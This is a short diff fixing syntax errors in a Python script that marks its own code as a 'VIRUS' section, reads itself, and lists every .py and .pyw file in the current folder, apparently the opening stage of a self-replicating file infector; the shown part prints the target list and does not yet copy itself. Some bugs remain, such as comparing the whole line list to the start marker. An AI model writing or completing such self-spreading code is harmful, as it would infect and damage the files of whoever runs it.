@@ -3,10 +3,10 @@
 import sys, glob
 
 code=[]
-with open(sys.argn[0], 'r') as f:
-	lines = r.readlines()
-	
-virus_area = false
+with open(sys.argv[0], 'r') as f:
+	lines = f.readlines()
+
+virus_area = False
 for line in lines:
 	if lines == '###   START OF VIRUS###\n':
 		virus_area = True
@@ -15,6 +15,6 @@ for line in lines:
 	if line == '### END OF VIRUS ###\n':
 		break
 python_script = glob.glob('*.py') + glob.glob('*.pyw')
-prin(python_script)
+print(python_script)
 
 ###   END OF VIRUS   ###
